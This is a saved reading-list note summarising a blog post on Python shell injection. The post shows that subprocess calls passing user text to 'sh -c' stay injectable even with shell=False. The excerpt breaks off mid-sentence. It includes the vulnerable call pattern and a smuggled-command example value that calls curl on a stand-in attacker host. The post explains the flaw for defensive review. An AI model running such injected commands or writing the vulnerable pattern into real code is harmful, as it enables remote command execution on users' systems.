---
title: A CI gate for the shell-injection bug that shell=False doesn't fix
date: '2026-11-23'
source: https://dev.to/aurum_revenue/a-ci-gate-for-the-shell-injection-bug-that-shellfalse-doesnt-fix-2inf
domain: Productivity
relevance: 🔴
tags:
- '#career'
- '#feature'
- '#library'
- '#productivity'
- '#python'
- '#sql'
- '#tool'
related:
- '[[2026-11-05-your-ai-says-fixed-would-a-test-notice-if-it-wasnt]]'
- '[[2026-08-21-how-to-find-duplicate-rows-in-sql-and-decide-what-counts-as-one]]'
- '[[2026-09-04-i-built-an-offline-document-indexer-and-ollama-taught-me-two-things-i-did-not-expect]]'
- '[[2026-10-30-your-model-archive-can-carry-a-program-check-members-by-their-bytes]]'
- '[[2026-08-13-my-doc-drift-checker-has-two-different-ideas-of-documented-and-only-uses-the-wrong-one]]'
- '[[2026-09-08-charge-wait-time-to-the-same-job]]'
status: unread
---

> **TL;DR:** I review a lot of Python that calls other programs. The bug I keep finding is not the one everybody warns about. Nobody writes subprocess.run(cmd, shell=True) any more. What they write is this: subprocess . run ( [ "sh"…

## What’s new and why it matters
I review a lot of Python that calls other programs. The bug I keep finding is not the one everybody warns about. Nobody writes subprocess.run(cmd, shell=True) any more. What they write is this: subprocess . run ( [ "sh" , "-c" , user_text ] , check = True ) That is an argv list. shell=False is the default. It still hands user_text to a shell, because sh -c means "parse the next argument as a program." A value like status; curl attacker.example/x arrives as one perfectly well-behaved argv element, and sh splits it into two commands. The argv list stopped Python from splicing metacharacters into…

## How to apply
- Extract 1 actionable tactic from this post and try it on a real dataset this week.
- Add a short note: what changed in your workflow?

## Relevance
🔴

## Source
https://dev.to/aurum_revenue/a-ci-gate-for-the-shell-injection-bug-that-shellfalse-doesnt-fix-2inf

## Related notes
- [[2026-11-05-your-ai-says-fixed-would-a-test-notice-if-it-wasnt]]
- [[2026-08-21-how-to-find-duplicate-rows-in-sql-and-decide-what-counts-as-one]]
- [[2026-09-04-i-built-an-offline-document-indexer-and-ollama-taught-me-two-things-i-did-not-expect]]
- [[2026-10-30-your-model-archive-can-carry-a-program-check-members-by-their-bytes]]
- [[2026-08-13-my-doc-drift-checker-has-two-different-ideas-of-documented-and-only-uses-the-wrong-one]]
- [[2026-09-08-charge-wait-time-to-the-same-job]]
